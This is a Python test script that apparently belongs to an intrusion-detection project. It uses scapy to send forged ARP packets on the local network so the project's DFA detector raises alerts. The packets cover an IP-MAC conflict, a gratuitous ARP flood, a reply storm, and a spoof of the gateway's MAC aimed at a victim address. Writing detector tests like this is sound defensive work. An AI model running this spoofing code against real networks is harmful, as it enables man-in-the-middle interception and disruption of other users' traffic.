"""
Test DFA (Deterministic Finite Automaton) detection by generating ARP spoofing attacks.
This simulates ARP cache poisoning attacks that the DFA filter should detect.
"""

from scapy.all import *
import time
import random

def print_header(msg):
    print(f"\n{'='*70}")
    print(f"  {msg}")
    print(f"{'='*70}\n")

def test_ip_mac_conflict():
    """
    Test 1: IP-MAC Mapping Conflict
    Send ARP packets with same IP but different MAC addresses.
    DFA should detect this as potential ARP spoofing.
    """
    print_header("TEST 1: IP-MAC Mapping Conflict (ARP Spoofing)")
    
    target_ip = "192.168.1.100"
    real_mac = "aa:bb:cc:dd:ee:01"
    fake_mac = "aa:bb:cc:dd:ee:99"  # Different MAC
    
    print(f"Step 1: Sending ARP with {target_ip} → {real_mac}")
    arp1 = ARP(op=2, psrc=target_ip, hwsrc=real_mac, pdst="192.168.1.1")
    send(arp1, verbose=0)
    time.sleep(1)
    
    print(f"Step 2: Sending ARP with {target_ip} → {fake_mac} (CONFLICT!)")
    arp2 = ARP(op=2, psrc=target_ip, hwsrc=fake_mac, pdst="192.168.1.1")
    send(arp2, verbose=0)
    
    print("\n✓ DFA should detect IP-MAC conflict!")
    print(f"  Alert: 'IP-MAC conflict: {target_ip} previous {real_mac} now {fake_mac}'")
    time.sleep(2)

def test_gratuitous_arp_flood():
    """
    Test 2: Gratuitous ARP Flooding
    Send many ARP packets from same MAC in short time.
    DFA should detect this as ARP cache poisoning attempt.
    """
    print_header("TEST 2: Gratuitous ARP Flood (Cache Poisoning)")
    
    attacker_mac = "de:ad:be:ef:ca:fe"
    attacker_ip = "192.168.1.66"
    
    print(f"Sending 10 gratuitous ARP packets from {attacker_mac}...")
    print("(Threshold: 5 packets in 5 seconds)")
    
    for i in range(10):
        # Gratuitous ARP: sender and target are the same
        arp = ARP(op=2, psrc=attacker_ip, hwsrc=attacker_mac, 
                 pdst=attacker_ip, hwdst="ff:ff:ff:ff:ff:ff")
        send(arp, verbose=0)
        print(f"  Sent packet {i+1}/10...")
        time.sleep(0.3)  # 300ms between packets = ~3.3 per second
    
    print("\n✓ DFA should detect excessive gratuitous ARPs!")
    print(f"  Alert: 'Excessive gratuitous ARPs from {attacker_mac} (>5 in 5s)'")
    time.sleep(2)

def test_arp_spoofing_scenario():
    """
    Test 3: Real ARP Spoofing Scenario
    Simulate man-in-the-middle attack by spoofing gateway.
    """
    print_header("TEST 3: ARP Spoofing Attack (MITM Simulation)")
    
    gateway_ip = "192.168.1.1"
    legitimate_gateway_mac = "aa:bb:cc:11:22:33"
    attacker_mac = "ba:dd:c0:ff:ee:00"
    victim_ip = "192.168.1.50"
    
    print(f"Scenario: Attacker tries to intercept traffic between")
    print(f"  Victim: {victim_ip}")
    print(f"  Gateway: {gateway_ip} (real MAC: {legitimate_gateway_mac})")
    
    print(f"\nStep 1: Legitimate gateway ARP...")
    arp_legit = ARP(op=2, psrc=gateway_ip, hwsrc=legitimate_gateway_mac,
                    pdst=victim_ip)
    send(arp_legit, verbose=0)
    time.sleep(1)
    
    print(f"Step 2: Attacker sends spoofed ARP claiming to be gateway...")
    arp_spoof = ARP(op=2, psrc=gateway_ip, hwsrc=attacker_mac,  # Same IP, different MAC!
                   pdst=victim_ip)
    send(arp_spoof, verbose=0)
    
    print("\n✓ DFA should detect this as IP-MAC conflict!")
    print(f"  Alert: Gateway IP {gateway_ip} MAC changed from {legitimate_gateway_mac} to {attacker_mac}")
    time.sleep(2)

def test_arp_reply_storm():
    """
    Test 4: ARP Reply Storm
    Send rapid ARP replies to simulate network attack.
    """
    print_header("TEST 4: ARP Reply Storm")
    
    storm_mac = "ff:ee:dd:cc:bb:aa"
    
    print(f"Sending rapid ARP replies from {storm_mac}...")
    
    for i in range(20):
        random_ip = f"192.168.1.{random.randint(10, 250)}"
        arp = ARP(op=2, psrc=random_ip, hwsrc=storm_mac,
                 pdst="192.168.1.1")
        send(arp, verbose=0)
        if i % 5 == 0:
            print(f"  Sent {i+1}/20 ARP replies...")
        time.sleep(0.2)
    
    print("\n✓ DFA should detect excessive ARPs from same MAC!")
    time.sleep(2)

def main():
    """Run all DFA detection tests."""
    print("\n" + "="*70)
    print("  SafeLink DFA Detection Test Suite")
    print("  ARP Spoofing & Cache Poisoning Attacks")
    print("="*70)
    
    print("\n⚠ IMPORTANT:")
    print("  • Make sure the packet sniffer is running!")
    print("  • Go to: http://localhost:5173/sniffer")
    print("  • Click 'Start Sniffer'")
    print("  • Then press ENTER to continue...")
    input()
    
    print("\n⚠ Note: These tests send ARP packets on your local network.")
    print("  • They use fake/test IP/MAC addresses")
    print("  • Should not affect real network devices")
    print("  • Run at your own risk!")
    print("\nPress ENTER to start tests...")
    input()
    
    try:
        # Run all tests
        test_ip_mac_conflict()
        test_gratuitous_arp_flood()
        test_arp_spoofing_scenario()
        test_arp_reply_storm()
        
        print_header("All DFA Tests Complete!")
        print("✓ Attack simulation finished!")
        print("\nCheck the following for DFA detections:")
        print("  • Dashboard: http://localhost:5173/")
        print("  • Alerts Page: http://localhost:5173/alerts")
        print("  • Run: python check_dfa.py")
        print("\nLook for alerts with module='DFA' in the alerts table!")
        print("\nExpected DFA detections:")
        print("  1. IP-MAC conflicts (2-3 detections)")
        print("  2. Excessive gratuitous ARPs (1-2 detections)")
        
    except KeyboardInterrupt:
        print("\n\n⚠ Tests interrupted by user")
    except Exception as e:
        print(f"\n\n❌ Error during testing: {e}")
        import traceback
        traceback.print_exc()
    
    print("\n" + "="*70)
    print("  To verify DFA detections:")
    print("="*70)
    print("\n  python check_dfa.py")
    print("\nThis will show all DFA alerts from the database.")

if __name__ == "__main__":
    import sys
    import ctypes
    
    # Check admin privileges
    if sys.platform == "win32":
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                print("\n⚠ WARNING: This script requires Administrator privileges!")
                print("Please run PowerShell or CMD as Administrator, then run:")
                print("  cd E:\\coreproject\\Backend\\SafeLink_Backend")
                print("  ..\\..\\venv\\Scripts\\activate")
                print("  python test_dfa.py")
                sys.exit(1)
        except:
            pass
    
    main()
